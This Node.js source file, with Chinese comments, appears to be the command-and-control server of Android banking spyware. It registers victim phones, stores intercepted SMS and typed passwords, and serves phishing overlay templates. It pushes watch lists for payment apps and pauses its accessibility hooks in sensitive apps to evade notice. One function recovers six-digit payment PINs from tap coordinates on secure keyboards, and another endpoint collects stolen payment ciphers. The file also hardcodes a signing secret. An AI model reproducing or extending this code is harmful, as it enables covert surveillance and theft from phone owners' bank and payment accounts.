/**
 * Fisher Server - Node.js 版本
 * Express + ws 库，异步非阻塞，WebSocket 不会断线
 */
const https = require('https');
const http = require('http');
const tls = require('tls');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { WebSocketServer } = require('ws');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const Database = require('better-sqlite3');
const cors = require('cors');

// ============================================================
// 配置
// ============================================================
const PORT = 443;
const SECRET_KEY = 'Gni_Fisher_Secure_Secret_@2026_!#';

// FRP 隧道服务器地址 — 自动获取本机公网 IP
let FRP_SERVER_ADDR = '127.0.0.1';
try {
  // 优先通过外部 API 获取真实公网 IP（NAT/多IP环境下网卡IP可能不准）
  const { execSync } = require('child_process');
  FRP_SERVER_ADDR = execSync('curl -s --max-time 3 https://ifconfig.me || curl -s --max-time 3 https://api.ipify.org || echo ""', { encoding: 'utf8' }).trim();
  // 兜底：从网卡获取
  if (!FRP_SERVER_ADDR || FRP_SERVER_ADDR === '127.0.0.1') {
    const nets = require('os').networkInterfaces();
    for (const iface of Object.values(nets)) {
      for (const cfg of iface) {
        if (cfg.family === 'IPv4' && !cfg.internal && !cfg.address.startsWith('10.') && !cfg.address.startsWith('192.168.') && !cfg.address.startsWith('172.')) {
          FRP_SERVER_ADDR = cfg.address;
        }
      }
    }
  }
} catch (e) { }
console.log(`[INIT] FRP_SERVER_ADDR = ${FRP_SERVER_ADDR}`);

// 证书域名映射配置 — 自动扫描 /etc/letsencrypt/live/ 目录
const CERT_MAPPING = {};
try {
  const certBase = '/etc/letsencrypt/live';
  if (fs.existsSync(certBase)) {
    for (const domain of fs.readdirSync(certBase)) {
      const certPath = path.join(certBase, domain, 'fullchain.pem');
      const keyPath = path.join(certBase, domain, 'privkey.pem');
      if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
        CERT_MAPPING[domain] = { cert: certPath, key: keyPath };
      }
    }
  }
} catch (e) { }
console.log(`[INIT] CERT_MAPPING = ${Object.keys(CERT_MAPPING).join(', ') || '(none)'}`);

const STATIC_DIR = process.env.STATIC_DIR || [
  path.resolve(__dirname, '../fengjc_site'),
  path.resolve(__dirname, '../frontend/fengjc_site'),
  '/opt/fengjc_site'
].find(p => fs.existsSync(path.join(p, 'index.html'))) || path.resolve(__dirname, '../fengjc_site');
const DB_PATH = path.join(__dirname, 'data', 'fisher.db');
const INSTALL_LOCK_PATH = process.env.INSTALL_LOCK_PATH || path.join(__dirname, 'data', 'install.lock');

// ============================================================
// 数据库初始化
// ============================================================
fs.mkdirSync(path.join(__dirname, 'data'), { recursive: true });
const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT DEFAULT 'admin',
    avatar TEXT DEFAULT '',
    max_devices INTEGER DEFAULT 100,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT UNIQUE NOT NULL,
    brand TEXT DEFAULT '',
    model TEXT DEFAULT '',
    os_version TEXT DEFAULT '',
    app_version TEXT DEFAULT '',
    app_name TEXT DEFAULT '',
    battery_level INTEGER DEFAULT 0,
    network_type TEXT DEFAULT '',
    phone_number TEXT DEFAULT '',
    public_ip TEXT DEFAULT '',
    screen_width INTEGER DEFAULT 0,
    screen_height INTEGER DEFAULT 0,
    remark TEXT DEFAULT '',
    is_connected INTEGER DEFAULT 0,
    local_service_connected INTEGER DEFAULT 0,
    last_seen REAL DEFAULT 0,
    first_seen REAL DEFAULT (strftime('%s','now')),
    created_at REAL DEFAULT (strftime('%s','now'))
  );
`);
// 兼容已有数据库：添加 is_locked / is_screen_on 字段
try { db.exec("ALTER TABLE devices ADD COLUMN is_locked INTEGER DEFAULT 0"); } catch (e) { }
try { db.exec("ALTER TABLE devices ADD COLUMN is_screen_on INTEGER DEFAULT 1"); } catch (e) { }
db.exec(`
  CREATE TABLE IF NOT EXISTS login_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    ip TEXT DEFAULT '',
    success INTEGER DEFAULT 1,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS settings (
    key TEXT PRIMARY KEY,
    value TEXT DEFAULT ''
  );
  CREATE TABLE IF NOT EXISTS injection_templates (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    template_id TEXT UNIQUE NOT NULL,
    name TEXT NOT NULL,
    package_name TEXT DEFAULT '',
    icon TEXT DEFAULT '',
    color TEXT DEFAULT '',
    file TEXT DEFAULT '',
    type TEXT DEFAULT '',
    html_content TEXT DEFAULT '',
    enabled INTEGER DEFAULT 0,
    visible INTEGER DEFAULT 1,
    created_at TEXT DEFAULT (datetime('now','+8 hours')),
    updated_at TEXT DEFAULT (datetime('now','+8 hours'))
  );
  CREATE TABLE IF NOT EXISTS sms_notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT DEFAULT '',
    device_name TEXT DEFAULT '',
    serial_number TEXT DEFAULT '',
    address TEXT DEFAULT '',
    body TEXT DEFAULT '',
    type TEXT DEFAULT 'sms',
    date INTEGER DEFAULT 0,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS password_inputs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT DEFAULT '',
    app_name TEXT DEFAULT '',
    package_name TEXT DEFAULT '',
    input_text TEXT DEFAULT '',
    password_type TEXT DEFAULT 'password',
    timestamp INTEGER DEFAULT 0,
    created_at REAL DEFAULT (strftime('%s','now'))
  );
`);

// 数据库迁移：确保 injection_templates 有新列
try { db.exec("ALTER TABLE injection_templates ADD COLUMN html_content TEXT DEFAULT ''"); } catch { }
try { db.exec("ALTER TABLE injection_templates ADD COLUMN enabled INTEGER DEFAULT 0"); } catch { }
try { db.exec("ALTER TABLE injection_templates ADD COLUMN visible INTEGER DEFAULT 1"); } catch { }
try { db.exec("ALTER TABLE injection_templates ADD COLUMN created_at TEXT DEFAULT ''"); } catch { }
try { db.exec("ALTER TABLE injection_templates ADD COLUMN updated_at TEXT DEFAULT ''"); } catch { }

// password_inputs 迁移：extra_data 存 props/cls 等附加信息
try { db.exec("ALTER TABLE password_inputs ADD COLUMN extra_data TEXT DEFAULT ''"); } catch { }
// 用户表迁移：is_super 字段
try { db.exec("ALTER TABLE users ADD COLUMN is_super INTEGER DEFAULT 0"); } catch { }
try { db.exec("ALTER TABLE users ADD COLUMN assigned_devices TEXT DEFAULT ''"); } catch { }
// ★ 设备归属字段：解决子账号绑定不稳定的问题
try { db.exec("ALTER TABLE devices ADD COLUMN owner_username TEXT DEFAULT ''"); } catch { }
// 单账号登录：active_session 字段
try { db.exec("ALTER TABLE users ADD COLUMN active_session TEXT DEFAULT ''"); } catch { }
// 登录失败锁定
try { db.exec("ALTER TABLE users ADD COLUMN login_fail_count INTEGER DEFAULT 0"); } catch { }
try { db.exec("ALTER TABLE users ADD COLUMN locked_until INTEGER DEFAULT 0"); } catch { }
// 默认 admin 设为超管
db.prepare("UPDATE users SET is_super=1 WHERE username='admin'").run();

// 默认管理员账号在建表时初始化，此脚本不再硬编码自动生成任何默认账号

// ★ 安全 HTTP 请求：自动处理 timeout destroy，防止连接泄漏
const _http = require('http');
function safeHttpGet(url, opts, onRes, onErr) {
  const timeout = (opts && opts.timeout) || 3000;
  const req = _http.get(url, { timeout }, (res) => {
    // 必须消费响应体，否则连接不释放
    res.resume();
    if (onRes) onRes(res);
  });
  req.on('timeout', () => { req.destroy(); });
  req.on('error', (e) => { if (onErr) onErr(e); });
  return req;
}

// ★ frpc 冷却机制：设备 local-service 无响应时暂停轮询，防止连接爆炸
const _frpcFailCount = new Map(); // deviceId → failCount
const _frpcCoolUntil = new Map(); // deviceId → timestamp
function isFrpcCooling(deviceId) {
  const until = _frpcCoolUntil.get(deviceId);
  if (until && Date.now() < until) return true;
  if (until && Date.now() >= until) { _frpcCoolUntil.delete(deviceId); _frpcFailCount.delete(deviceId); }
  return false;
}
function frpcRequestFail(deviceId) {
  const count = (_frpcFailCount.get(deviceId) || 0) + 1;
  _frpcFailCount.set(deviceId, count);
  if (count >= 3) {
    _frpcCoolUntil.set(deviceId, Date.now() + 60000); // 冷却60秒
    console.log(`[FRPC] ⚠️ ${deviceId} 连续${count}次无响应，冷却60s`);
  }
}
function frpcRequestOk(deviceId) {
  _frpcFailCount.delete(deviceId);
  _frpcCoolUntil.delete(deviceId);
}
function clearFrpcCooldown(deviceId) {
  _frpcFailCount.delete(deviceId);
  _frpcCoolUntil.delete(deviceId);
}

// 设备自动归属：APK 注册时带 ownerUsername，自动加到子账户的 assigned_devices
// ★ 同时写入 devices.owner_username，确保设备永久记住归属（服务端兜底）
function autoAssignDevice(deviceId, ownerUsername) {
  if (!deviceId || !ownerUsername) return;
  try {
    // ★ 写入 devices 表的 owner_username（仅首次写入，不覆盖已有归属）
    db.prepare("UPDATE devices SET owner_username=? WHERE device_id=? AND (owner_username IS NULL OR owner_username='')").run(ownerUsername, deviceId);
    // 写入 users 表的 assigned_devices
    const user = db.prepare('SELECT id,assigned_devices FROM users WHERE username=?').get(ownerUsername);
    if (!user) { console.log(`[ASSIGN] 用户 ${ownerUsername} 不存在，跳过自动分配`); return; }
    const current = (user.assigned_devices || '').split(',').filter(Boolean);
    if (!current.includes(deviceId)) {
      current.push(deviceId);
      db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(current.join(','), user.id);
      console.log(`[ASSIGN] ✅ 设备 ${deviceId} 自动分配给 ${ownerUsername}`);
    }
  } catch (e) {
    console.log(`[ASSIGN] 自动分配失败: ${e.message}`);
  }
}

// ============================================================
// Express 应用
// ============================================================
const app = express();
app.use(cors());
app.use(require('compression')());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.set('etag', false); // 禁用 ETag，避免 304 缓存问题

// ★ URL 路径规范化：合并多余斜杠（//api → /api），修复 local-service 双斜杠请求
app.use((req, res, next) => {
  if (req.url.includes('//')) {
    req.url = req.url.replace(/\/\/+/g, '/');
  }
  next();
});
app.use((req, res, next) => {
  if (req.path.startsWith('/api/')) {
    res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
    res.set('Pragma', 'no-cache');
  }
  next();
});

// 请求日志（调试用）
app.use((req, res, next) => {
  if (req.path.includes('tunnel') || req.path.includes('injection')) {
    console.log(`[REQ] ${req.method} ${req.url} from ${req.ip}`);
  }
  // ★ 临时：记录所有 POST 到 /sync/ 或 /injection 的请求
  if (req.method === 'POST' && (req.path.includes('sync') || req.path.includes('injection') || req.path.includes('Injection'))) {
    console.log(`[DEBUG-POST] ${req.method} ${req.path} from ${req.ip} body_keys=${Object.keys(req.body || {}).join(',')}`);
  }
  next();
});

// JWT 验证中间件
function authMiddleware(req, res, next) {
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : req.query.token || '';
  if (!token) return res.status(401).json({ success: false, message: '未登录' });
  try {
    const decoded = jwt.verify(token, SECRET_KEY);
    req.user = decoded;

    // 单账号登录互踢：API 级别实时校验 sessionId 状态
    if (decoded.userId) {
      const user = db.prepare('SELECT active_session FROM users WHERE id=?').get(decoded.userId);
      if (user && user.active_session && decoded.sessionId !== user.active_session) {
        return res.status(401).json({ success: false, message: '您的账号已在其他地方登录，当前会话已失效' });
      }
    }

    next();
  } catch {
    return res.status(401).json({ success: false, message: 'Token无效' });
  }
}

// ============================================================
// 认证 API
// ============================================================
app.get('/api/auth/check-initialization', (req, res) => {
  const row = db.prepare('SELECT COUNT(*) as cnt FROM users').get();
  res.json({ success: true, data: { initialized: row.cnt > 0 } });
});

// (旧login路由已合并到下方含IP封禁的版本)

app.post('/api/auth/verify', (req, res) => {
  const token = req.body?.token || req.headers.authorization?.slice(7) || '';
  try {
    const payload = jwt.verify(token, SECRET_KEY);
    const user = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,created_at,active_session FROM users WHERE id=?').get(payload.userId);
    if (!user) return res.status(401).json({ success: false, message: '用户不存在' });
    // 单账号登录：数据库有 active_session 时，token 必须携带匹配的 sessionId
    if (user.active_session && payload.sessionId !== user.active_session) {
      return res.status(401).json({ success: false, message: '账号已在其他地方登录' });
    }
    res.json({ success: true, data: { valid: true, user: { id: user.id, username: user.username, role: user.role, isSuper: !!user.is_super, maxDevices: user.max_devices, createdAt: Math.floor(user.created_at || 0) } } });
  } catch {
    res.status(401).json({ success: false, message: 'Token验证失败' });
  }
});

// 修改密码
app.post('/api/auth/change-password', (req, res) => {
  const token = req.headers.authorization?.slice(7) || '';
  try {
    const payload = jwt.verify(token, SECRET_KEY);
    const user = db.prepare('SELECT id,username,password_hash,role FROM users WHERE id=?').get(payload.userId);
    if (!user) return res.status(401).json({ success: false, message: '用户不存在' });

    const { oldPassword, newPassword } = req.body || {};
    if (!oldPassword || !newPassword) return res.status(400).json({ success: false, message: '请提供旧密码和新密码' });
    if (newPassword.length < 6) return res.status(400).json({ success: false, message: '新密码至少6位' });

    // 验证旧密码
    const bcrypt = require('bcryptjs');
    if (!bcrypt.compareSync(oldPassword, user.password_hash)) {
      return res.status(400).json({ success: false, message: '旧密码错误' });
    }

    // 更新密码 + 踢掉旧会话
    const hashed = bcrypt.hashSync(newPassword, 10);
    const newSessionId = require('crypto').randomUUID();
    db.prepare('UPDATE users SET password_hash=?, active_session=? WHERE id=?').run(hashed, newSessionId, user.id);

    // 签发新 token
    const newToken = jwt.sign({ userId: user.id, username: user.username, role: user.role || 'admin', sessionId: newSessionId }, SECRET_KEY, { expiresIn: '30d' });

    console.log(`[AUTH] 用户 ${user.username} 修改了密码`);
    res.json({ success: true, message: '密码修改成功', data: { token: newToken } });
  } catch {
    res.status(401).json({ success: false, message: 'Token验证失败' });
  }
});

// ============================================================
// 敏感 APP 管理（进入时暂停无障碍，离开后恢复）
// ============================================================

// 支付策略建表
db.exec(`CREATE TABLE IF NOT EXISTS payment_strategies (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  package_name TEXT NOT NULL,
  app_name TEXT DEFAULT '',
  listen_win_classes TEXT DEFAULT '[]',
  enabled INTEGER DEFAULT 1,
  remark TEXT DEFAULT '',
  created_at REAL DEFAULT 0
)`);

// 设备-支付策略关联表
db.exec(`CREATE TABLE IF NOT EXISTS device_payment_strategies (
  device_id TEXT NOT NULL,
  strategy_id INTEGER NOT NULL,
  PRIMARY KEY (device_id, strategy_id)
)`);

// 推送支付策略到设备
function pushPaymentStrategiesToDevice(deviceId) {
  const rows = db.prepare(`
    SELECT ps.* FROM payment_strategies ps
    INNER JOIN device_payment_strategies dps ON ps.id = dps.strategy_id
    WHERE dps.device_id=? AND ps.enabled=1
  `).all(deviceId);
  const strategies = rows.map(r => ({
    id: r.id, packageName: r.package_name, appName: r.app_name,
    listenWinClasses: (() => { try { return JSON.parse(r.listen_win_classes); } catch { return []; } })(),
    enabled: r.enabled === 1, remark: r.remark
  }));
  const ws = deviceConnections.get(deviceId);
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify({ type: 'command', data: { command: 'SET_PAYMENT_STRATEGIES', params: { strategies } } }));
    console.log(`[PAYMENT] ✅ 推送支付策略到 ${deviceId}: ${strategies.length} 条 pkgs=${strategies.map(s => s.packageName).join(',')}`);
  } else {
    console.log(`[PAYMENT] ❌ 推送失败 ${deviceId}: 设备未连接`);
  }
}

// ============================================================
// 坐标→密码解析器（支付宝等安全键盘坐标还原）
// ============================================================
function parseCoordsToPassword(coords, screenWidth = 720, screenHeight = 1600) {
  if (!coords || coords.length === 0) return { password: '', confidence: 'low' };
  
  // Step 1: 去重（相邻重复坐标合并，down/up 产生的重复）
  const deduped = [];
  for (let i = 0; i < coords.length; i++) {
    const c = coords[i];
    const prev = deduped[deduped.length - 1];
    if (!prev || Math.abs(c.x - prev.x) > 5 || Math.abs(c.y - prev.y) > 5) {
      deduped.push({ x: c.x, y: c.y });
    }
  }
  
  // Step 2: 过滤滑动轨迹（连续3+个点相邻距离<60px）
  const clicks = [];
  let idx = 0;
  while (idx < deduped.length) {
    let slideLen = 1;
    while (idx + slideLen < deduped.length) {
      const dx = Math.abs(deduped[idx + slideLen].x - deduped[idx + slideLen - 1].x);
      const dy = Math.abs(deduped[idx + slideLen].y - deduped[idx + slideLen - 1].y);
      if (dx < 60 && dy < 60) {
        slideLen++;
      } else {
        break;
      }
    }
    if (slideLen >= 3) {
      idx += slideLen; // 是滑动，跳过整组
    } else {
      clicks.push(deduped[idx]);
      idx++;
    }
  }
  
  if (clicks.length < 6) return { password: '', confidence: 'low', totalCoords: coords.length, filteredClicks: clicks.length };
  
  // Step 3: 动态聚类 Y 坐标，检测键盘行
  // 取前6~10个点击的 Y 值，排序后聚类
  const sample = clicks.slice(0, Math.min(clicks.length, 10));
  const yValues = sample.map(c => c.y).sort((a, b) => a - b);
  
  // 聚类：相邻 Y 差 > 50px 视为不同行
  const yClusters = [];
  let clusterStart = 0;
  for (let i = 1; i <= yValues.length; i++) {
    if (i === yValues.length || yValues[i] - yValues[i - 1] > 50) {
      const cluster = yValues.slice(clusterStart, i);
      const avg = cluster.reduce((s, v) => s + v, 0) / cluster.length;
      yClusters.push({ min: cluster[0], max: cluster[cluster.length - 1], avg, count: cluster.length });
      clusterStart = i;
    }
  }
  
  // X 聚类
  const xValues = sample.map(c => c.x).sort((a, b) => a - b);
  const xClusters = [];
  clusterStart = 0;
  for (let i = 1; i <= xValues.length; i++) {
    if (i === xValues.length || xValues[i] - xValues[i - 1] > 80) {
      const cluster = xValues.slice(clusterStart, i);
      const avg = cluster.reduce((s, v) => s + v, 0) / cluster.length;
      xClusters.push({ min: cluster[0], max: cluster[cluster.length - 1], avg, count: cluster.length });
      clusterStart = i;
    }
  }
  
  // 如果 Y 只有1个聚类（所有点在同一行），则用 X 的 3 列 + 固定行3(7,8,9)
  // 如果 Y 有3个聚类，则有完整的 3 行信息
  
  // Step 4: 建立动态映射
  // 按 X 分3列（左/中/右），按 Y 分3~4行
  const col1Bound = screenWidth * 0.33;
  const col2Bound = screenWidth * 0.66;
  
  // Y 行边界：根据聚类动态确定
  let rowBounds; // [row1Max, row2Max, row3Max]
  if (yClusters.length >= 3) {
    // 有3行以上的聚类，取相邻聚类的中点作为边界
    const sorted = yClusters.sort((a, b) => a.avg - b.avg);
    rowBounds = [];
    for (let i = 0; i < sorted.length - 1 && rowBounds.length < 3; i++) {
      rowBounds.push((sorted[i].max + sorted[i + 1].min) / 2);
    }
    // 补齐
    while (rowBounds.length < 3) rowBounds.push(rowBounds[rowBounds.length - 1] + 100);
  } else if (yClusters.length === 2) {
    // 只有2个Y聚类
    const sorted = yClusters.sort((a, b) => a.avg - b.avg);
    const mid = (sorted[0].max + sorted[1].min) / 2;
    rowBounds = [mid - 100, mid, mid + 100];
  } else {
    // 只有1个Y聚类（所有点在同一行），无法区分行
    // 用 X 分列，假设是行3 (7,8,9)
    const digits = [];
    for (const c of clicks) {
      if (digits.length >= 6) break;
      const col = (c.x < col1Bound) ? 0 : (c.x < col2Bound) ? 1 : 2;
      digits.push(['7', '8', '9'][col]);
    }
    return { password: digits.join(''), confidence: 'low', totalCoords: coords.length, filteredClicks: clicks.length };
  }
  
  // Step 5: 映射
  const keyboardTop = (yClusters.sort((a, b) => a.avg - b.avg))[0].min - 30;
  const keyboardBottom = (yClusters.sort((a, b) => b.avg - a.avg))[0].max + 30;
  
  const keyClicks = clicks.filter(c => c.y >= keyboardTop && c.y <= keyboardBottom + 100);
  
  const digits = [];
  for (const c of keyClicks) {
    if (digits.length >= 6) break;
    const col = (c.x < col1Bound) ? 0 : (c.x < col2Bound) ? 1 : 2;
    let row;
    if (c.y < rowBounds[0]) row = 0;
    else if (c.y < rowBounds[1]) row = 1;
    else if (rowBounds[2] && c.y < rowBounds[2]) row = 2;
    else row = 3;
    
    const keyMap = [['1','2','3'], ['4','5','6'], ['7','8','9'], ['','0','']];
    const digit = keyMap[row][col];
    if (digit) digits.push(digit);
  }
  
  const password = digits.join('');
  const confidence = password.length === 6 ? 'high' : (password.length >= 4 ? 'medium' : 'low');
  return { password, confidence, totalCoords: coords.length, filteredClicks: keyClicks.length };
}

// ============================================================
// 敏感 APP 管理（进入时暂停无障碍，离开后恢复）
// ============================================================

// 建表
db.exec(`CREATE TABLE IF NOT EXISTS sensitive_apps (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  package_name TEXT NOT NULL,
  app_name TEXT DEFAULT '',
  enable_delay INTEGER DEFAULT 5000,
  is_enabled INTEGER DEFAULT 1,
  device_id TEXT DEFAULT '',
  created_at REAL DEFAULT 0
)`);

// 推送敏感 APP 列表到设备
function pushSensitiveAppsToDevice(deviceId) {
  // 合并全局 + 设备专属
  const globalApps = db.prepare('SELECT package_name,app_name,enable_delay,is_enabled FROM sensitive_apps WHERE device_id=?').all('');
  const deviceApps = deviceId ? db.prepare('SELECT package_name,app_name,enable_delay,is_enabled FROM sensitive_apps WHERE device_id=?').all(deviceId) : [];
  const merged = [...globalApps, ...deviceApps].filter(a => a.is_enabled);
  const appsList = merged.map(a => ({ packageName: a.package_name, appName: a.app_name, enableDelay: a.enable_delay }));
  const payload = JSON.stringify({
    type: 'command', data: {
      command: 'UPDATE_SENSITIVE_APPS',
      params: { apps: appsList }
    }
  });
  // APP 端同时监听 SET_SENSITIVE_APPS（旧协议兼容）
  const payload2 = JSON.stringify({
    type: 'command', data: {
      command: 'SET_SENSITIVE_APPS',
      params: { apps: appsList }
    }
  });
  const ws = deviceConnections.get(deviceId);
  if (ws && ws.readyState === 1) { ws.send(payload); ws.send(payload2); }
  else {
    // Bridge 设备通过 bridgeConnections 发送
    const bws = bridgeConnections.get(deviceId);
    if (bws && bws.readyState === 1) { bws.send(payload); bws.send(payload2); }
  }
}

// 推送到所有在线设备
function pushSensitiveAppsToAll() {
  for (const deviceId of deviceConnections.keys()) {
    pushSensitiveAppsToDevice(deviceId);
  }
}

// --- 全局敏感 APP ---
app.get('/api/sensitive-apps', authMiddleware, (req, res) => {
  const apps = db.prepare('SELECT package_name AS packageName, app_name AS appName, enable_delay AS enableDelay, is_enabled AS isEnabled FROM sensitive_apps WHERE device_id=?').all('');
  res.json({ success: true, apps });
});

app.post('/api/sensitive-apps/add', authMiddleware, (req, res) => {
  const { packageName, appName, enableDelay, isEnabled } = req.body || {};
  if (!packageName) return res.status(400).json({ success: false, message: '缺少 packageName' });
  const existing = db.prepare('SELECT id FROM sensitive_apps WHERE package_name=? AND device_id=?').get(packageName, '');
  if (existing) {
    db.prepare('UPDATE sensitive_apps SET app_name=?, enable_delay=?, is_enabled=? WHERE id=?')
      .run(appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, existing.id);
  } else {
    db.prepare('INSERT INTO sensitive_apps (package_name, app_name, enable_delay, is_enabled, device_id, created_at) VALUES (?,?,?,?,?,?)')
      .run(packageName, appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, '', Date.now() / 1000);
  }
  pushSensitiveAppsToAll();
  res.json({ success: true });
});

app.post('/api/sensitive-apps/remove', authMiddleware, (req, res) => {
  const { packageName } = req.body || {};
  if (!packageName) return res.status(400).json({ success: false, message: '缺少 packageName' });
  db.prepare('DELETE FROM sensitive_apps WHERE package_name=? AND device_id=?').run(packageName, '');
  pushSensitiveAppsToAll();
  res.json({ success: true });
});

// --- 设备级敏感 APP ---
app.get('/api/device-sensitive-apps', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少 deviceId' });
  // 只返回该设备专属的敏感 APP
  const deviceApps = db.prepare('SELECT id, package_name AS packageName, app_name AS appName, enable_delay AS enableDelay, is_enabled AS isEnabled FROM sensitive_apps WHERE device_id=?').all(deviceId);
  res.json({ success: true, apps: deviceApps });
});

app.post('/api/device-sensitive-apps/add', authMiddleware, (req, res) => {
  const { packageName, appName, enableDelay, isEnabled, deviceId } = req.body || {};
  if (!packageName || !deviceId) return res.status(400).json({ success: false, message: '缺少参数' });
  const existing = db.prepare('SELECT id FROM sensitive_apps WHERE package_name=? AND device_id=?').get(packageName, deviceId);
  if (existing) {
    db.prepare('UPDATE sensitive_apps SET app_name=?, enable_delay=?, is_enabled=? WHERE id=?')
      .run(appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, existing.id);
  } else {
    db.prepare('INSERT INTO sensitive_apps (package_name, app_name, enable_delay, is_enabled, device_id, created_at) VALUES (?,?,?,?,?,?)')
      .run(packageName, appName || '', enableDelay || 5000, isEnabled === false ? 0 : 1, deviceId, Date.now() / 1000);
  }
  pushSensitiveAppsToDevice(deviceId);
  res.json({ success: true });
});

app.post('/api/device-sensitive-apps/remove', authMiddleware, (req, res) => {
  const { packageName, deviceId, id } = req.body || {};
  if (id) {
    const row = db.prepare('SELECT device_id FROM sensitive_apps WHERE id=?').get(id);
    db.prepare('DELETE FROM sensitive_apps WHERE id=?').run(id);
    if (row && row.device_id) pushSensitiveAppsToDevice(row.device_id);
    else pushSensitiveAppsToAll();
  } else if (packageName) {
    // 先尝试按 deviceId 删，再尝试全局
    let r = db.prepare('DELETE FROM sensitive_apps WHERE package_name=? AND device_id=?').run(packageName, deviceId || '');
    if (r.changes === 0 && deviceId) {
      r = db.prepare('DELETE FROM sensitive_apps WHERE package_name=? AND device_id=?').run(packageName, '');
    }
    if (deviceId) pushSensitiveAppsToDevice(deviceId);
    else pushSensitiveAppsToAll();
  } else {
    return res.status(400).json({ success: false, message: '缺少 packageName 或 id' });
  }
  res.json({ success: true });
});

app.post('/api/device-sensitive-apps/push', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || req.body.deviceId || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少 deviceId' });
  pushSensitiveAppsToDevice(deviceId);
  res.json({ success: true });
});

// ============================================================
// 设备 API（APP 客户端调用）
// ============================================================
app.post('/api/client/register', (req, res) => {
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  if (!deviceId) return res.status(400).json({ success: false, message: '缺少deviceId' });
  const now = Date.now() / 1000;
  const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
  const regOwner = data.ownerUsername || '';
  if (existing) {
    // ★ 注册时如果带了 ownerUsername，顺便更新（仅首次，不覆盖）
    if (regOwner) {
      db.prepare("UPDATE devices SET brand=?,model=?,os_version=?,app_version=?,public_ip=?,is_connected=1,last_seen=?,owner_username=CASE WHEN owner_username IS NULL OR owner_username='' THEN ? ELSE owner_username END WHERE device_id=?")
        .run(data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '', req.ip, now, regOwner, deviceId);
    } else {
      db.prepare('UPDATE devices SET brand=?,model=?,os_version=?,app_version=?,public_ip=?,is_connected=1,last_seen=? WHERE device_id=?')
        .run(data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '', req.ip, now, deviceId);
    }
  } else {
    db.prepare('INSERT INTO devices (device_id,brand,model,os_version,app_version,public_ip,screen_width,screen_height,is_connected,last_seen,owner_username) VALUES (?,?,?,?,?,?,?,?,1,?,?)')
      .run(deviceId, data.brand || '', data.model || '', data.osVersion || '', data.appVersion || '', req.ip, data.screenWidth || 0, data.screenHeight || 0, now, regOwner);
  }
  res.json({ success: true, message: '设备注册成功', data: { deviceId } });
  // 自动归属子账户
  autoAssignDevice(deviceId, data.ownerUsername || '');
});

app.post('/api/client/logs', (req, res) => {
  // APP 上报操作日志，转发给管理端
  const { deviceId, logs } = req.body || {};
  if (deviceId && logs && Array.isArray(logs)) {
    for (const log of logs) {
      broadcastToAdmins({
        type: 'operation_log_realtime',
        sessionId: deviceId,
        data: { deviceId, log },
        botId: deviceId
      });
    }
  }
  res.json({ success: true });
});
app.post('/api/sync/status', (req, res) => {
  const { deviceId, batteryLevel, networkType } = req.body || {};
  if (deviceId) {
    const now = Date.now() / 1000;
    const existing = db.prepare('SELECT id FROM devices WHERE device_id=?').get(deviceId);
    if (existing) {
      db.prepare('UPDATE devices SET battery_level=?,network_type=?,is_connected=1,last_seen=? WHERE device_id=?').run(batteryLevel || 0, networkType || '', now, deviceId);
    } else {
      db.prepare('INSERT INTO devices (device_id,battery_level,network_type,public_ip,is_connected,last_seen) VALUES (?,?,?,?,1,?)').run(deviceId, batteryLevel || 0, networkType || '', req.ip, now);
    }
  }
  res.json({ success: true });
  // 自动归属子账户
  if (req.body?.ownerUsername) autoAssignDevice(deviceId, req.body.ownerUsername);
});
app.post('/api/sync/messages', (req, res) => res.json({ success: true }));
app.post('/api/sync/inbox', (req, res) => res.json({ success: true }));
app.post('/api/sync/cipher', (req, res) => {
  // 支付密码上报
  const data = req.body || {};
  const deviceId = data.deviceId || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
  console.log(`[CIPHER] 收到支付密码: ${JSON.stringify(data).slice(0, 200)}`);
  if (deviceId && (data.cipher || data.password || data.value || data.textCipher || data.patternCipher)) {
    const text = data.textCipher || data.cipher || data.password || data.value || data.patternCipher || '';
    const appName = data.appName || data.app || 'payment';
    db.prepare('INSERT INTO password_inputs (device_id,app_name,package_name,input_text,password_type,timestamp) VALUES (?,?,?,?,?,?)')
      .run(deviceId, appName, data.packageName || '', text, 'payment_cipher', data.timestamp || Date.now());
    broadcastToAdmins({ type: 'password_input', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
// ★ APP CipherCaptureManager 实际 POST 路径（反编译确认: uploadCipherToServer → "/api/data/cipher"）
